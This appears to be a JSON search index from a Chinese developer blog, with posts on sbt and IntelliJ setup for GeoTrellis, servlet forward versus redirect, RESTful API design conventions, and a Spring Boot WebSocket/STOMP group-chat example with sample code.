-Dsbt.ivy.home=E:/dev_tools/sbt/.ivy2 -Dsbt.global.base=E:/dev_tools/sbt/.sbt -Dsbt.repository.config=E:/dev_tools/sbt/conf/repository.properties 这些是设置sbt下载项目依赖目录。\n3.IDEA安装Scala插件 4.sbt换源，解决速度慢的问题 https://segmentfault.com/a/1190000021817234\n根据官方文档，首先要设置sbt.override.build.repos为true才能换源。设置以后sbt就会读取~/.sbt/repositories文件中的[repositories]部分。\n设置方法（适用于Windows）就是将sbt安装目录下的conf/sbtconfig.txt中增加一行JVM启动参数 -Dsbt.override.build.repos=true\n而对于Intellij Idea，则是在设置中sbt页面的VM Parameters中增加同样的一行启动配置 -Dsbt.override.build.repos=true\n这里给出我的配置文件，使用的是阿里云的maven仓库，保存的路径为~/.sbt/repositories\n1 2 3 4 5 6 7 8 [repositories] local aliyun: https://maven.aliyun.com/repository/public typesafe: https://repo.typesafe.com/typesafe/ivy-releases/, [organization]/[module]/(scala_[scalaVersion]/)(sbt_[sbtVersion]/)[revision]/[type]s/[artifact](-[classifier]).[ext], bootOnly ivy-sbt-plugin:https://dl.bintray.com/sbt/sbt-plugin-releases/, [organization]/[module]/(scala_[scalaVersion]/)(sbt_[sbtVersion]/)[revision]/[type]s/[artifact](-[classifier]).[ext] sonatype-oss-releases maven-central sonatype-oss-snapshots 5.IDEA创建项目 ①新建项目\n②选择File-\u0026gt;project Structure\n左边选择Modules 右边选择Sources，将src目录Mark as Sources后就可以在src下新建Scala类了\n然后右边继续选择Dependencies，点击+号，添加Scala类库\n前面的勾要勾选上\n③修改sbt构建设置\n修改sbt构建设置，其中VM parameters配置为\n1 2 3 4 5 6 7 8 -Xmx512M -XX:MaxPermSize=256m -XX:ReservedCodeCacheSize=128m -Dsbt.log.format=true -Dsbt.ivy.home=E:/dev_tools/sbt/.ivy2 -Dsbt.global.base=E:/dev_tools/sbt/.sbt -Dsbt.repository.config=E:/dev_tools/sbt/conf/repository.properties ④关于新建sbt task的步骤和设置\n选择run-\u0026gt;edit configuration,点击左上角+号，选择sbt task\ntasks输入:~run\nVM parameters输入:\n1 2 3 4 5 6 7 8 9 -Xms512M -Xmx1024M -Xss1M -XX:+CMSClassUnloadingEnabled -Dsbt.log.format=true -Dsbt.boot.directory=E:/dev_tools/sbt/.sbt/boot -Dsbt.ivy.home=E:/dev_tools/sbt/.ivy2 -Dsbt.global.base=E:/dev_tools/sbt/.sbt -Dsbt.repository.config=E:/dev_tools/sbt/conf/repository.properties ⑤创建文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package main.scala /** * @Description * @Author bin * @Date 2021/12/18 */ object Test extends App { val ages = Seq(42, 75, 29, 64) println(s\u0026#34;The oldest person is ${ages.max}\u0026#34;) } object Test { def main(args: Array[String]) : Unit = { val msg = \u0026#34;hello world\u0026#34; println(msg) } } 运行的时候出现如下错误：\nBuild出现如下错误：\nExtracting structure failed, reason: not ok build status:\n==上面http换成https之后就没有报这个错误了==\nGeoTrellis使用 1.入门 教程\n拉官网给的代码运行\n打开项目后先build一下，这个步骤要花费不少的时间\n然后copy如下代码进行测试\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 package demo import geotrellis.raster._ import geotrellis.raster.mapalgebra.focal.Square import geotrellis.spark._ object Main { def helloSentence = \u0026#34;Hello GeoTrellis\u0026#34; def helloRaster(): Unit = { val nd = NODATA //-2147483648 val input = Array[Int]( nd, 7, 1, 1, 3, 5, 9, 8, 2, 9, 1, 1, 2, 2, 2, 4, 3, 5, 3, 8, 1, 3, 3, 3, 1, 2, 2, 2, 4, 7, 1, nd, 1, 8, 4, 3) //将数组转化为4*9矩阵 val iat = IntArrayTile(input, 9, 4) //用一个n*n的窗口对矩阵做卷积，设中心值为平均值 //Square(i) =\u0026gt; n = 2 * i + 1 val focalNeighborhood = Square(1) println(focalNeighborhood) val meanTile = iat.focalMean(focalNeighborhood) for (i \u0026lt;- 0 to 3) { for (j \u0026lt;- 0 to 8) { print(meanTile.getDouble(j, i) + \u0026#34; \u0026#34;) } println() } } def main(args: Array[String]): Unit = { helloRaster() } } 2.读本地Geotiff文件 一共四行代码\n1 2 3 4 5 import geotrellis.raster.io.geotiff.reader.GeoTiffReader import geotrellis.raster.io.geotiff._ val path: String = \u0026#34;filepath/filename.tif\u0026#34; val geoTiff: SinglebandGeoTiff = GeoTiffReader.readSingleband(path) 这种方法用于读取但波段tif影像，要读取多波段影像，可以用\n1 val geoTiff: MultibandGeoTiff = GeoTiffReader.readMultiband(path) 如果强行用GeoTiffReader.readSingleband(path)方法去读取一个多波段影像，则最后的返回结果是一个单波段影像，且其中的数据为原始影像中的第一个波段。\n此外，也可以用影像路径为参数直接构造一个Geotiff对象\n1 2 3 import geotrellis.raster.io.geotiff.SinglebandGeoTiff val geoTiff: SinglebandGeoTiff = SinglebandGeoTiff(path) 3.发布TMS服务 akka scala的akka框架有一个极简的http service组件，是把原来spray框架集成到akka里面修改而成。\nWebServer.scala\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 package demo import akka.actor.ActorSystem import akka.http.javadsl.server.Route import akka.http.scaladsl.Http//http().bindandhandle import akka.http.scaladsl.model.{ContentTypes, HttpEntity} import akka.stream.ActorMaterializer import scala.io.StdIn import akka.http.scaladsl.model._ import akka.http.scaladsl.server.Directives._//path/get/complete import akka.http.scaladsl.server.Directive0 import akka.http.scaladsl.server.Route /** * @Description * @Author bin * @Date 2021/12/20 */ object WebServer { def main(args: Array[String]): Unit = { implicit val system = ActorSystem(\u0026#34;my-system\u0026#34;) implicit val materilizer = ActorMaterializer() implicit val executionContext = system.dispatcher lazy val route = path(\u0026#34;register\u0026#34;){ get { complete(HttpEntity(ContentTypes.`text/html(UTF-8)`, \u0026#34;\u0026lt;h1\u0026gt;Welcome to register my project\u0026lt;/h1\u0026gt;\u0026#34;)) } } val bindingFuture = Http().bindAndHandle(route,\u0026#34;localhost\u0026#34;,8080) println(s\u0026#34;Server online at http://localhost:8080/\\nPress RETURN to stop...\u0026#34;) StdIn.readLine() bindingFuture //.flatMap(_.unbind()) .onComplete(_ =\u0026gt; system.terminate()) } } 配置文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 // Rename this as you see fit name := \u0026#34;geotrellis-sbt-template\u0026#34; version := \u0026#34;0.2.0\u0026#34; scalaVersion := \u0026#34;2.11.12\u0026#34; lazy val akkaHttpVersion = \u0026#34;10.0.11\u0026#34; lazy val akkaVersion = \u0026#34;2.5.8\u0026#34; lazy val root = (project in file(\u0026#34;.\u0026#34;)) .settings( inThisBuild(List( organization :=\u0026#34;com.example\u0026#34;, scalaVersion :=\u0026#34;2.12.4\u0026#34; )), name := \u0026#34;My-first-akka-http-project\u0026#34;, libraryDependencies ++= Seq( \u0026#34;com.typesafe.akka\u0026#34; %% \u0026#34;akka-http\u0026#34; % akkaHttpVersion, \u0026#34;com.typesafe.akka\u0026#34; %% \u0026#34;akka-http-spray-json\u0026#34; % akkaHttpVersion, \u0026#34;com.typesafe.akka\u0026#34; %% \u0026#34;akka-http-xml\u0026#34; % akkaHttpVersion, \u0026#34;com.typesafe.akka\u0026#34; %% \u0026#34;akka-stream\u0026#34; % akkaVersion, ) ) geotrellis-landsat-tutorial 以官网的例子为例，跑一个demo\n做数据处理的时候报了如下错误，看来还是要先了解一下hadoop\n","permalink":"https://chance7bin.github.io/posts/note/geotrellis/","summary":"什么是GeoTrellis？ GeoTrellis 是一个 Scala 库和框架，它使用 Apache Spark 处理栅格数据。 GeoTrellis 以尽可能快的速度读取、写入和操作栅格数据。它实现了许多地图代数操作","title":"GeoTrellis"},{"content":"转发和重定向区别详解 作为一名java web开发的程序员，在使用servlet/jsp的时候，我们必须要知道实现页面跳转的两种方式的区别和联系：即转发和重定向的区别。\n1、request.getRequestDispatcher().forward()方法,只能将请求转发给同一个WEB应用中的组件；而response.sendRedirect() 方法不仅可以重定向到当前应用程序中的其他资源，还可以重定向到同一个站点上的其他应用程序中的资源，甚至是使用绝对URL重定向到其他站点的资源。\n如果传递给response.sendRedirect()方法的相对URL以“/”开头，它是相对于整个WEB站点的根目录；如果创建request.getRequestDispatcher()对象时指定的相对URL以“/”开头，它是相对于当前WEB应用程序的根目录。\n2、重定向访问过程结束后，浏览器地址栏中显示的URL会发生改变，由初始的URL地址变成重定向的目标URL；请求转发过程结束后，浏览器地址栏保持初始的URL地址不变。\n3、HttpServletResponse.sendRedirect方法对浏览器的请求直接作出响应，响应的结果就是告诉浏览器去重新发出对另外一个URL的访问请求，这个过程好比有个绰号叫“浏览器”的人写信找张三借钱，张三回信说没有钱，让“浏览器”去找李四借，并将李四现在的通信地址告诉给了“浏览器”。于是，“浏览器”又按张三提供通信地址给李四写信借钱，李四收到信后就把钱汇给了“浏览器”。\n由此可见，重定向的时候，“浏览器”一共发出了两封信和收到了两次回复，“浏览器”也知道他借到的钱出自李四之手。\nrequest.getRequestDispatcher().forward()方法在服务器端内部将请求转发给另外一个资源，浏览器只知道发出了请求并得到了响应结果，并不知道在服务器程序内部发生了转发行为。这个过程好比绰号叫“浏览器”的人写信找张三借钱，张三没有钱，于是张三找李四借了一些钱，甚至还可以加上自己的一些钱，然后再将这些钱汇给了“浏览器”。\n由此可见，转发的时候，“浏览器”只发 出了一封信和收到了一次回复，他只知道从张三那里借到了钱，并不知道有一部分钱出自李四之手。\n4、request.getRequestDispatcher().forward()方法的调用者与被调用者之间共享相同的request对象和response对象，它们属于同一个访问请求和响应过程；\n而response.sendRedirect()方法调用者与被调用者使用各自的request对象和response对象，它们属于两个独立的访问请求和响应过程。对于同一个WEB应用程序的内部资源之间的跳转，特别是跳转之前要对请求进行一些前期预处理，并要使用HttpServletRequest.setAttribute方法传递预处理结果，那就应该使用request.getRequestDispatcher().forward()方法。不同WEB应用程序之间的重定向，特别是要重定向到另外一个WEB站点上的资源的情况，都应该使用response.sendRedirect()方法。\n5、无论是request.getRequestDispatcher().forward()方法，还是response.sendRedirect()方法，在调用它们之前，都不能有内容已经被实际输出到了客户端。如果缓冲区中已经有了一些内容，这些内容将被从缓冲区中。\n以上五点的论述来源于：点击查看原文论述\n转发和重定向的图解 两种跳转获得对象的方式 1 2 3 4 5 6 //获得转发对象getRequestDispatcher() HttpServletRequest(httpServletRequest).getRequestDispatcher ServletContext.getRequestDispatcher(); //获得重定向对象sendRedirect() HttpServletResponse(httpServletResponse).sendRedirect(); 转发和跳转的小结 1、转发使用的是getRequestDispatcher()方法;重定向使用的是sendRedirect();\n2、转发：浏览器URL的地址栏不变。重定向：浏览器URL的地址栏改变；\n3、转发是服务器行为，重定向是客户端行为；\n4、转发是浏览器只做了一次访问请求。重定向是浏览器做了至少两次的访问请求；\n5、转发2次跳转之间传输的信息不会丢失，重定向2次跳转之间传输的信息会丢失（request范围）。\n转发和重定向的选择 1、重定向的速度比转发慢，因为浏览器还得发出一个新的请求，如果在使用转发和重定向都无所谓的时候建议使用转发。\n2、因为转发只能访问当前WEB的应用程序，所以不同WEB应用程序之间的访问，特别是要访问到另外一个WEB站点上的资源的情况，这个时候就只能使用重定向了。\n转发和重定向的应用场景 在上面我已经提到了，转发是要比重定向快，因为重定向需要经过客户端，而转发没有。有时候，采用重定向会更好，若需要重定向到另外一个外部网站，则无法使用转发。另外，重定向还有一个应用场景：避免在用户重新加载页面时两次调用相同的动作。\n例如，当提交产品表单的时候，执行保存的方法将会被调用，并执行相应的动作；这在一个真实的应用程序中，很有可能将表单中的所有产品信息加入到数据库中。但是如果在提交表单后，重新加载页面，执行保存的方法就很有可能再次被调用。同样的产品信息就将可能再次被添加，为了避免这种情况，提交表单后，你可以将用户重定向到一个不同的页面，这样的话，这个网页任意重新加载都没有副作用；\n但是，使用重定向不太方便的地方是，使用它无法将值轻松地传递给目标页面。而采用转发，则可以简单地将属性添加到Model,使得目标视图可以轻松访问。由于重定向经过客户端，所以Model中的一切都会在重定向时丢失。但幸运的是，在Spring3.1版本以后，我们可以通过Flash属性，解决重定向时传值丢失的问题。\n要使用Flash属性，必须在Spring MVC的配置文件中添加一个\u0026lt;annotation-driven/\u0026gt;。然后，还必须再方法上添加一个新的参数类型：org.springframework.web.servlet.mvc.support.RedirectAttributes。\n如下所示：\n1 2 3 4 5 6 7 8 9 10 11 @RequestMapping(value=\u0026#34;saveProduct\u0026#34;,method=RequestMethod.POST) public String saveProduct(ProductForm productForm,RedirectAttributes redirectAttributes){ //执行产品保存的业务逻辑等 //传递参数 redirectAttributes.addFlashAttribute(\u0026#34;message\u0026#34;,\u0026#34;The product is saved successfully\u0026#34;); //执行重定向 return \u0026#34;redirect:/……\u0026#34;; } 一、请求转发和重定向 请求转发： request.getRequestDispatcher(URL地址).forward(request, response)\n处理流程：\n客户端发送请求，Servlet做出业务逻辑处理。 Servlet调用forword()方法，服务器Servlet把目标资源返回给客户端浏览器。 2）重定向： response.sendRedirect(URL地址)\n处理流程：\n客户端发送请求，Servlet做出业务逻辑处理。 Servlet调用response.sendReadirect()方法，把要访问的目标资源作为response响应头信息发给客户端浏览器。 客户端浏览器重新访问服务器资源xxx.jsp，服务器再次对客户端浏览器做出响应。 以上两种情况，你都需要考虑Servlet处理完后，数据如何在jsp页面上呈现。图例是请求、响应的流程，没有标明数据如何处理、展现。\n二、转发和重定向的路径问题 1）使用相对路径在重定向和转发中没有区别\n2）重定向和请求转发使用绝对路径时，根/路径代表了不同含义\n重定向response.sendRedirect(\u0026ldquo;xxx\u0026rdquo;)是服务器向客户端发送一个请求头信息，由客户端再请求一次服务器。/指的Tomcat的根目录,写绝对路径应该写成\u0026quot;/当前Web程序根名称/资源名\u0026quot; 。如\u0026quot;/WebModule/login.jsp\u0026quot;,\u0026quot;/bbs/servlet/LoginServlet\u0026quot;\n转发是在服务器内部进行的，写绝对路径/开头指的是当前的Web应用程序。绝对路径写法就是\u0026quot;/login.jsp\u0026quot;或\u0026quot;/servlet/LoginServlet\u0026quot;。\n总结：以上要注意是区分是从服务器外的请求，还在是内部转发，从服务器外的请求，从Tomcat根写起(就是要包括当前Web的根)；是服务器内部的转发，很简单了，因为在当前服务器内，/写起指的就是当前Web的根目录。\n三、转发和重定向的区别 request.getRequestDispatcher()是容器中控制权的转向，在客户端浏览器地址栏中不会显示出转向后的地址；服务器内部转发，整个过程处于同一个请求当中。response.sendRedirect()则是完全的跳转，浏览器将会得到跳转的地址，并重新发送请求链接。这样，从浏览器的地址栏中可以看到跳转后的链接地址。不在同一个请求。重定向，实际上客户端会向服务器端发送两个请求。所以转发中数据的存取可以用request作用域：request.setAttribute(), request.getAttribute()，重定向是取不到request中的数据的。只能用session。 forward()更加高效，在可以满足需要时，尽量使用RequestDispatcher.forward()方法。（思考一下为什么？） RequestDispatcher是通过调用HttpServletRequest对象的getRequestDispatcher()方法得到的，是属于请求对象的方法。sendRedirect()是HttpServletResponse对象的方法，即响应对象的方法，既然调用了响应对象的方法，那就表明整个请求过程已经结束了，服务器开始向客户端返回执行的结果。 重定向可以跨域访问，而转发是在web服务器内部进行的，不能跨域访问。 ","permalink":"https://chance7bin.github.io/posts/note/%E8%BD%AC%E5%8F%91%E5%92%8C%E9%87%8D%E5%AE%9A%E5%90%91/","summary":"转发和重定向区别详解 作为一名java web开发的程序员，在使用servlet/jsp的时候，我们必须要知道实现页面跳转的两种方式的区别和联系","title":"转发和重定向"},{"content":"restful风格API 设计指南 一、协议 API与用户的通信协议，总是使用HTTPs协议。\n二、域名 应该尽量将API部署在专用域名之下。\nhttps://api.example.com\n如果确定API很简单，不会有进一步扩展，可以考虑放在主域名下。\nhttps://example.org/api/\n三、版本（Versioning） 应该将API的版本号放入URL。\nhttps://api.example.com/v1/\n另一种做法是，将版本号放在HTTP头信息中，但不如放入URL方便和直观。Github采用这种做法。\n四、路径（Endpoint） 路径又称\u0026quot;终点\u0026quot;（endpoint），表示API的具体网址。\n在RESTful架构中，每个网址代表一种资源（resource），所以网址中不能有动词，只能有名词，而且所用的名词往往与数据库的表格名对应。一般来说，数据库中的表都是同种记录的\u0026quot;集合\u0026quot;（collection），所以API中的名词也应该使用复数。\n举例来说，有一个API提供动物园（zoo）的信息，还包括各种动物和雇员的信息，则它的路径应该设计成下面这样。\nhttps://api.example.com/v1/zoos\nhttps://api.example.com/v1/animals\nhttps://api.example.com/v1/employees\n五、HTTP动词 对于资源的具体操作类型，由HTTP动词表示。\n常用的HTTP动词有下面五个（括号里是对应的SQL命令）。\nGET（SELECT）：从服务器取出资源（一项或多项）。\nPOST（CREATE）：在服务器新建一个资源。\nPUT（UPDATE）：在服务器更新资源（客户端提供改变后的完整资源）。\nPATCH（UPDATE）：在服务器更新资源（客户端提供改变的属性）。\nDELETE（DELETE）：从服务器删除资源。\n还有两个不常用的HTTP动词。\nHEAD：获取资源的元数据。\nOPTIONS：获取信息，关于资源的哪些属性是客户端可以改变的。\n下面是一些例子。\nGET /zoos：列出所有动物园\nPOST /zoos：新建一个动物园\nGET /zoos/ID：获取某个指定动物园的信息\nPUT /zoos/ID：更新某个指定动物园的信息（提供该动物园的全部信息）\nPATCH /zoos/ID：更新某个指定动物园的信息（提供该动物园的部分信息）\nDELETE /zoos/ID：删除某个动物园\nGET /zoos/ID/animals：列出某个指定动物园的所有动物\nDELETE /zoos/ID/animals/ID：删除某个指定动物园的指定动物\n六、过滤信息（Filtering） 如果记录数量很多，服务器不可能都将它们返回给用户。API应该提供参数，过滤返回结果。\n下面是一些常见的参数。\n?limit=10：指定返回记录的数量\n?offset=10：指定返回记录的开始位置。\n?page=2\u0026amp;per_page=100：指定第几页，以及每页的记录数。\n?sortby=name\u0026amp;order=asc：指定返回结果按照哪个属性排序，以及排序顺序。\n?animal_type_id=1：指定筛选条件\n参数的设计允许存在冗余，即允许API路径和URL参数偶尔有重复。比如，GET /zoo/ID/animals 与 GET /animals?zoo_id=ID 的含义是相同的。\n七、状态码（Status Codes） 服务器向用户返回的状态码和提示信息，常见的有以下一些（方括号中是该状态码对应的HTTP动词）。\n200 OK - [GET]：服务器成功返回用户请求的数据，该操作是幂等的（Idempotent）。\n201 CREATED - [POST/PUT/PATCH]：用户新建或修改数据成功。\n202 Accepted - [*]：表示一个请求已经进入后台排队（异步任务）\n204 NO CONTENT - [DELETE]：用户删除数据成功。\n400 INVALID REQUEST - [POST/PUT/PATCH]：用户发出的请求有错误，服务器没有进行新建或修改数据的操作，该操作是幂等的。\n401 Unauthorized - [*]：表示用户没有权限（令牌、用户名、密码错误）。\n403 Forbidden - [*] 表示用户得到授权（与401错误相对），但是访问是被禁止的。\n404 NOT FOUND - [*]：用户发出的请求针对的是不存在的记录，服务器没有进行操作，该操作是幂等的。\n406 Not Acceptable - [GET]：用户请求的格式不可得（比如用户请求JSON格式，但是只有XML格式）。\n410 Gone -[GET]：用户请求的资源被永久删除，且不会再得到的。\n422 Unprocesable entity - [POST/PUT/PATCH] 当创建一个对象时，发生一个验证错误。\n500 INTERNAL SERVER ERROR - [*]：服务器发生错误，用户将无法判断发出的请求是否成功。\n状态码的完全列表参见这里。\n八、错误处理（Error handling） 如果状态码是4xx，就应该向用户返回出错信息。一般来说，返回的信息中将error作为键名，出错信息作为键值即可。\n{error:\u0026ldquo;Invalid API key\u0026rdquo;}\n九、返回结果 针对不同操作，服务器向用户返回的结果应该符合以下规范。\nGET /collection：返回资源对象的列表（数组）\nGET /collection/resource：返回单个资源对象\nPOST /collection：返回新生成的资源对象\nPUT /collection/resource：返回完整的资源对象\nPATCH /collection/resource：返回完整的资源对象\nDELETE /collection/resource：返回一个空文档\n十、Hypermedia API RESTful API最好做到Hypermedia，即返回结果中提供链接，连向其他API方法，使得用户不查文档，也知道下一步应该做什么。\n比如，当用户向api.example.com的根目录发出请求，会得到这样一个文档。\n{\u0026ldquo;link\u0026rdquo;:\n{\u0026ldquo;rel\u0026rdquo;:\u0026ldquo;collectionhttps://www.example.com/zoos\u0026rdquo;,\n\u0026ldquo;href\u0026rdquo;:\u0026ldquo;https://api.example.com/zoos\u0026quot;,\n\u0026ldquo;title\u0026rdquo;:\u0026ldquo;List of zoos\u0026rdquo;,\n\u0026ldquo;type\u0026rdquo;:\u0026ldquo;application/vnd.yourformat+json\u0026rdquo;\n}}\n上面代码表示，文档中有一个link属性，用户读取这个属性就知道下一步该调用什么API了。rel表示这个API与当前网址的关系（collection关系，并给出该collection的网址），href表示API的路径，title表示API的标题，type表示返回类型。\nHypermedia API的设计被称为HATEOAS。Github的API就是这种设计，访问api.github.com会得到一个所有可用API的网址列表。\n{\n\u0026ldquo;current_user_url\u0026rdquo;:\u0026ldquo;https://api.github.com/user\u0026quot;,\n\u0026ldquo;authorizations_url\u0026rdquo;:\u0026ldquo;https://api.github.com/authorizations\u0026quot;,\n// \u0026hellip;\n}\n从上面可以看到，如果想获取当前用户的信息，应该去访问api.github.com/user，然后就得到了下面结果。\n{\n\u0026ldquo;message\u0026rdquo;:\u0026ldquo;Requires authentication\u0026rdquo;,\n\u0026ldquo;documentation_url\u0026rdquo;:\u0026ldquo;https://developer.github.com/v3\u0026quot;\n}\n上面代码表示，服务器给出了提示信息，以及文档的网址。\n十一、其他 （1）API的身份认证应该使用OAuth 2.0框架。\n（2）服务器返回的数据格式，应该尽量使用JSON，避免使用XML。\n参考博客：https://www.jianshu.com/p/73d2415956bd\n","permalink":"https://chance7bin.github.io/posts/design/restful%E9%A3%8E%E6%A0%BCapi%E8%AE%BE%E8%AE%A1%E6%8C%87%E5%8D%97/","summary":"restful风格API 设计指南 一、协议 API与用户的通信协议，总是使用HTTPs协议。 二、域名 应该尽量将API部署在专用域名之下。 https://api.example.com 如果确","title":"restful风格API设计指南"},{"content":" WebSocket是一种在单个TCP连接上进行全双工通信的协议，浏览器和服务器只需要完成一次握手，两者之间就可以直接创建持久性的连接，并进行双向数据传输。\n消息群发 1.添加如下依赖 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-websocket\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.webjars\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;webjars-locator-core\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.webjars\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sockjs-client\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.1.2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.webjars\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;stomp-websocket\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.3.3\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.webjars\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jquery\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.3.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-security\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 2.配置WebSocket Spring框架提供了基于WebSocket的STOMP支持，STOMP是一个简单的可互操作的协议，通常被用于通过中间服务器在客户端之间进行异步消息传递。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 @Configuration @EnableWebSocketMessageBroker public class WebSocketConfig implements WebSocketMessageBrokerConfigurer { @Override public void configureMessageBroker(MessageBrokerRegistry registry) { // 如果消息的前缀是\u0026#34;/topic\u0026#34;，就会将消息转发给消息代理(broker) registry.enableSimpleBroker(\u0026#34;/topic\u0026#34;,\u0026#34;/queue\u0026#34;); // 前缀为\u0026#34;/app\u0026#34;的destination可以通过@MessageMapping注解的方法处理 registry.setApplicationDestinationPrefixes(\u0026#34;/app\u0026#34;); } @Override public void registerStompEndpoints(StompEndpointRegistry registry) { // 客户端通过这里配置的URL建立WebSocket连接 registry.addEndpoint(\u0026#34;portal/chat\u0026#34;).withSockJS(); } } 3.Controller 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 @Controller public class GreetingController { @Autowired SimpMessagingTemplate messagingTemplate; // @MessageMapping(\u0026#34;/hello\u0026#34;)用来接收\u0026#34;/app/hello\u0026#34;发送的消息 // 再将消息转发到@SendTo定义的路径上(前缀为\u0026#34;/topic\u0026#34;,消息将会被broker代理，再由broker广播) @MessageMapping(\u0026#34;/hello\u0026#34;) @SendTo(\u0026#34;/topic/greetings\u0026#34;) public Message greeting(Message message) throws Exception{ return message; } // @MessageMapping(\u0026#34;/hello\u0026#34;) // public void greeting(Message message) throws Exception{ // messagingTemplate.convertAndSend(\u0026#34;/topic/greetings\u0026#34;,message); // } } @Data public class Message { private String name; private String content; } 4.html 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;群聊\u0026lt;/title\u0026gt; \u0026lt;script src=\u0026#34;../lib/jquery/3.3.1/jquery.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;../lib/sockjs-client/1.1.2/sockjs.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;../lib/stomp-websocket/2.3.3/stomp.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;../js/app.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt; \u0026lt;label for=\u0026#34;name\u0026#34;\u0026gt;请输入用户名\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;name\u0026#34; placeholder=\u0026#34;用户名\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div\u0026gt; \u0026lt;button id=\u0026#34;connect\u0026#34; type=\u0026#34;button\u0026#34;\u0026gt;连接\u0026lt;/button\u0026gt; \u0026lt;button id=\u0026#34;disconnect\u0026#34; type=\u0026#34;button\u0026#34; disabled=\u0026#34;disabled\u0026#34;\u0026gt;断开连接\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;chat\u0026#34; style=\u0026#34;display: none\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt; \u0026lt;label for=\u0026#34;content\u0026#34;\u0026gt;请输入聊天内容\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;content\u0026#34; placeholder=\u0026#34;聊天内容\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;button id=\u0026#34;send\u0026#34; type=\u0026#34;button\u0026#34;\u0026gt;发送\u0026lt;/button\u0026gt; \u0026lt;div id=\u0026#34;greetings\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;conversation\u0026#34; style=\u0026#34;display: none\u0026#34;\u0026gt;群聊进行中...\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 5.JavaScript 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 var stompClient = null; function setConnected(connected) { $(\u0026#34;#connect\u0026#34;).prop(\u0026#34;disabled\u0026#34;,connected); $(\u0026#34;#disconnect\u0026#34;).prop(\u0026#34;disabled\u0026#34;,!connected); if (connected){ $(\u0026#34;#conversation\u0026#34;).show(); $(\u0026#34;#chat\u0026#34;).show(); } else { $(\u0026#34;#conversation\u0026#34;).hide(); $(\u0026#34;#chat\u0026#34;).hide(); } $(\u0026#34;#greetings\u0026#34;).html(\u0026#34;\u0026#34;); } function connect() { if (!$(\u0026#34;#name\u0026#34;).val()){ return; } var socket = new SockJS(\u0026#39;/portal/chat\u0026#39;); // 创建一个stomp实例发起连接请求 stompClient = Stomp.over(socket); stompClient.connect({}, function (frame) { setConnected(true); // 订阅服务端发回来的消息 stompClient.subscribe(\u0026#39;/topic/greetings\u0026#39;,function (greeting) { showGreeting(JSON.parse(greeting.body)) }); }); } function disconnect() { if (stompClient !== null){ stompClient.disconnect(); } setConnected(false); } function sendName() { stompClient.send(\u0026#34;/app/hello\u0026#34;,{}, JSON.stringify({\u0026#39;name\u0026#39;: $(\u0026#34;#name\u0026#34;).val(),\u0026#39;content\u0026#39;:$(\u0026#34;#content\u0026#34;).val()})); } function showGreeting(message) { $(\u0026#34;#greetings\u0026#34;) .append(\u0026#34;\u0026lt;div\u0026gt;\u0026#34; + message.name + \u0026#34;:\u0026#34; + message.content + \u0026#34;\u0026lt;/div\u0026gt;\u0026#34;) } 